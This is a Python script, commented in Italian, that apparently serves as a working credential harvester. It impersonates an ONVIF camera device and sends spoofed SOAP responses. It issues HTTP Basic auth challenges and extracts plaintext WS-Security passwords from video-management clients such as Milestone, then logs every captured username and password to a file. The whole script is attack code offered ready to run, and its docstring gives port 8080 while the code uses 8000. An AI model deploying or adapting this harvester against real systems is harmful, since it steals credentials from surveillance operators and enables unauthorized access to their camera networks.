#!/usr/bin/env python3
"""
ONVIF Credential Harvester
Finge di essere un device ONVIF sulla porta 8080.
Cattura le credenziali da:
  1. HTTP Basic Auth header
  2. WS-Security UsernameToken nel corpo SOAP (PasswordText)
Salva tutto in credentials.txt
"""

import base64
import socket
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from xml.etree import ElementTree as ET

CREDENTIALS_FILE = "credentials.txt"
PORT = 8000

# Namespace usati da WS-Security
NS = {
    "wsse": "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd",
    "wsu":  "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd",
    "s":    "http://www.w3.org/2003/05/soap-envelope",
    "s11":  "http://schemas.xmlsoap.org/soap/envelope/",
}

# Risposta minima ONVIF GetCapabilities per far credere al client che siamo un device reale
CAPABILITIES_RESPONSE = """<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope
  xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope"
  xmlns:tds="http://www.onvif.org/ver10/device/wsdl"
  xmlns:tt="http://www.onvif.org/ver10/schema">
  <SOAP-ENV:Body>
    <tds:GetCapabilitiesResponse>
      <tds:Capabilities>
        <tt:Device>
          <tt:XAddr>http://{host}:{port}/onvif/device_service</tt:XAddr>
          <tt:Network><tt:IPFilter>false</tt:IPFilter><tt:ZeroConfiguration>false</tt:ZeroConfiguration><tt:IPVersion6>false</tt:IPVersion6><tt:DynDNS>false</tt:DynDNS></tt:Network>
          <tt:System><tt:DiscoveryResolve>false</tt:DiscoveryResolve><tt:DiscoveryBye>false</tt:DiscoveryBye><tt:RemoteDiscovery>false</tt:RemoteDiscovery><tt:SystemBackup>false</tt:SystemBackup><tt:SystemLogging>false</tt:SystemLogging><tt:FirmwareUpgrade>false</tt:FirmwareUpgrade></tt:System>
          <tt:Security><tt:TLS1.1>false</tt:TLS1.1><tt:TLS1.2>false</tt:TLS1.2><tt:OnboardKeyGeneration>false</tt:OnboardKeyGeneration><tt:AccessPolicyConfig>false</tt:AccessPolicyConfig><tt:X.509Token>false</tt:X.509Token><tt:SAMLToken>false</tt:SAMLToken><tt:KerberosToken>false</tt:KerberosToken><tt:RELToken>false</tt:RELToken></tt:Security>
        </tt:Device>
      </tds:Capabilities>
    </tds:GetCapabilitiesResponse>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>"""

# Risposta generica per tutte le altre chiamate SOAP
GENERIC_SOAP_RESPONSE = """<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope">
  <SOAP-ENV:Body>
    <SOAP-ENV:Fault>
      <SOAP-ENV:Code><SOAP-ENV:Value>SOAP-ENV:Receiver</SOAP-ENV:Value></SOAP-ENV:Code>
      <SOAP-ENV:Reason><SOAP-ENV:Text xml:lang="en">Not implemented</SOAP-ENV:Text></SOAP-ENV:Reason>
    </SOAP-ENV:Fault>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>"""


def save_credentials(source: str, username: str, password: str, client_ip: str, path: str):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] source={source} ip={client_ip} username={username!r} password={password!r} path={path}\n"
    print(f"[+] CREDENZIALI CATTURATE: {line.strip()}")
    with open(CREDENTIALS_FILE, "a", encoding="utf-8") as f:
        f.write(line)


def extract_basic_auth(auth_header: str):
    """Estrae user e password da un header 'Basic <base64>'."""
    if not auth_header or not auth_header.lower().startswith("basic "):
        return None, None
    try:
        decoded = base64.b64decode(auth_header[6:]).decode("utf-8", errors="replace")
        if ":" in decoded:
            username, password = decoded.split(":", 1)
            return username, password
    except Exception:
        pass
    return None, None


def extract_wssec_credentials(body: bytes):
    """Estrae username e PasswordText da WS-Security UsernameToken."""
    try:
        root = ET.fromstring(body)
        # Cerca in entrambi i namespace SOAP (1.1 e 1.2)
        for env_ns in ("s", "s11"):
            header = root.find(f"{{{NS[env_ns]}}}Header")
            if header is None:
                continue
            security = header.find(f"{{{NS['wsse']}}}Security")
            if security is None:
                continue
            token = security.find(f"{{{NS['wsse']}}}UsernameToken")
            if token is None:
                continue
            username_el = token.find(f"{{{NS['wsse']}}}Username")
            password_el = token.find(f"{{{NS['wsse']}}}Password")
            if username_el is not None and password_el is not None:
                ptype = password_el.attrib.get("Type", "")
                # Cattura solo se è PasswordText (plaintext)
                if "PasswordText" in ptype or ptype == "":
                    return username_el.text, password_el.text
    except ET.ParseError:
        pass
    return None, None


class ONVIFHandler(BaseHTTPRequestHandler):

    def log_message(self, *_):
        pass

    def send_soap_response(self, body: str, status: int = 200):
        encoded = body.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/soap+xml; charset=utf-8")
        self.send_header("Content-Length", str(len(encoded)))
        self.end_headers()
        self.wfile.write(encoded)

    def challenge_basic_auth(self):
        self.send_response(401)
        self.send_header("WWW-Authenticate", 'Basic realm="ONVIF Device"')
        self.send_header("Content-Length", "0")
        self.end_headers()

    def log_request_details(self, body: bytes):
        client_ip = self.client_address[0]
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"\n{'='*60}")
        print(f"[{ts}] {self.command} {self.path}  —  da {client_ip}")
        print(f"  Headers:")
        for k, v in self.headers.items():
            print(f"    {k}: {v}")
        if body:
            try:
                text = body.decode("utf-8", errors="replace")
            except Exception:
                text = repr(body)
            print(f"  Body ({len(body)} bytes):")
            for line in text.splitlines():
                print(f"    {line}")
        else:
            print(f"  Body: <vuoto>")
        print(f"{'='*60}")

    def handle_request(self):
        client_ip = self.client_address[0]
        path = self.path
        auth_header = self.headers.get("Authorization", "")
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length > 0 else b""

        self.log_request_details(body)

        captured = False

        # --- 1. Prova Basic Auth dall'header HTTP ---
        if auth_header:
            username, password = extract_basic_auth(auth_header)
            if username is not None:
                save_credentials("HTTP-Basic", username, password, client_ip, path)
                captured = True
        else:
            # Nessun auth header: sfida con Basic per provocare il client
            print(f"[>] Nessun auth — invio 401 Basic challenge")
            self.challenge_basic_auth()
            return

        # --- 2. Prova WS-Security dal corpo SOAP ---
        if body:
            ws_user, ws_pass = extract_wssec_credentials(body)
            if ws_user is not None:
                save_credentials("WS-Security", ws_user, ws_pass if ws_pass is not None else "", client_ip, path)
                captured = True

        if not captured:
            print(f"[?] {client_ip} {self.command} {path} — nessuna credenziale trovata")

        # --- Risposta ONVIF fake ---
        host = self.headers.get("Host", f"localhost:{PORT}").split(":")[0]
        if body and b"GetCapabilities" in body:
            resp = CAPABILITIES_RESPONSE.format(host=host, port=PORT)
        else:
            resp = GENERIC_SOAP_RESPONSE
        self.send_soap_response(resp)

    def do_POST(self):
        self.handle_request()

    def do_GET(self):
        self.handle_request()


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


if __name__ == "__main__":
    local_ip = get_local_ip()
    server = HTTPServer(("0.0.0.0", PORT), ONVIFHandler)
    print(f"[*] ONVIF fake server in ascolto su 0.0.0.0:{PORT}")
    print(f"[*] Punta Milestone a: http://{local_ip}:{PORT}/onvif/device_service")
    print(f"[*] Credenziali salvate in: {CREDENTIALS_FILE}")
    print("[*] Ctrl+C per fermare\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stop.")
